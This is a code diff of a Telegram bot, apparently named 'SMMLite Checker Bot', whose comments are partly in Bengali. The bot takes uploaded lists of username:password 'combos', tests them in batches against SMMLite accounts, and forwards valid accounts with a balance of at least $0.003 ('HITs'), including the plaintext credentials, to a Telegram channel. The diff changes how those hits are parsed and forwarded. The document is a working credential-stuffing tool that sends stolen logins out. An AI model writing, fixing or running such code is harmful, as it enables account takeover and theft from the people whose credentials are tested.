@@ -1,4 +1,4 @@
-// api/telegram.js – SMMLite with batch processing (using relative URL)
+// api/telegram.js – SMMLite with batch processing and fixed HIT detection
 import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/config.js';
 
 const BATCH_SIZE = 50;
@@ -16,7 +16,7 @@ export default async function handler(req, res) {
   const document = body.message.document;
 
   if (text === '/start') {
-    await sendMessage(chatId, "🤖 SMMLite Checker Bot\nSend a .txt file with combos (user:pass each line).\nI'll check in batches (50 at a time) and forward HITs (balance ≥ $0.003) to the channel.");
+    await sendMessage(chatId, "🤖 SMMLite Checker Bot\nSend a .txt file with combos (user:pass each line).\nI'll check in batches and forward HITs (balance ≥ $0.003) to the channel.");
     return res.status(200).json({ ok: true });
   }
 
@@ -63,20 +63,19 @@ export default async function handler(req, res) {
       const batchNum = Math.floor(i / BATCH_SIZE) + 1;
       const totalBatches = Math.ceil(combos.length / BATCH_SIZE);
 
-      // ব্যাচ চেক – আপেক্ষিক URL ব্যবহার
-      const result = await checkBatch(batch);
+      const results = await checkBatch(batch);
       
-      // রেজাল্ট প্রসেস
-      for (const res of result) {
+      for (const res of results) {
         totalChecked++;
         if (res.valid && res.hit) {
           totalHits++;
-          allHits.push(res);
-          await forwardToChannel(res.username, res.password, res);
+          // combo থেকে ইউজারনেম ও পাসওয়ার্ড আলাদা
+          const [username, password] = res.combo.split(':');
+          allHits.push({ ...res, username, password });
+          await forwardToChannel(username, password, res);
         }
       }
 
-      // প্রতি ব্যাচ শেষে প্রগ্রেস আপডেট
       if (totalBatches > 1) {
         await sendMessage(chatId, `⏳ Batch ${batchNum}/${totalBatches} done (${Math.min(i + BATCH_SIZE, combos.length)}/${combos.length}) | Hits so far: ${totalHits}`);
       }
@@ -97,10 +96,9 @@ export default async function handler(req, res) {
   return res.status(200).json({ ok: true });
 }
 
-// ---------- ব্যাচ চেক ফাংশন (আপেক্ষিক URL) ----------
+// ---------- ব্যাচ চেক ফাংশন ----------
 async function checkBatch(batch) {
   try {
-    // Vercel-এ আপেক্ষিক পাথ কাজ করে
     const baseUrl = process.env.VERCEL_URL 
       ? `https://${process.env.VERCEL_URL}` 
       : 'https://smmlitetgversion.vercel.app';
@@ -115,7 +113,7 @@ async function checkBatch(batch) {
   } catch (err) {
     return batch.map(combo => {
       const [username, password] = combo.split(':');
-      return { username, password, combo, valid: false, hit: false, balance: 0, message: `Error: ${err.message}` };
+      return { combo, username, password, valid: false, hit: false, balance: 0, message: `Error: ${err.message}` };
     });
   }
 }
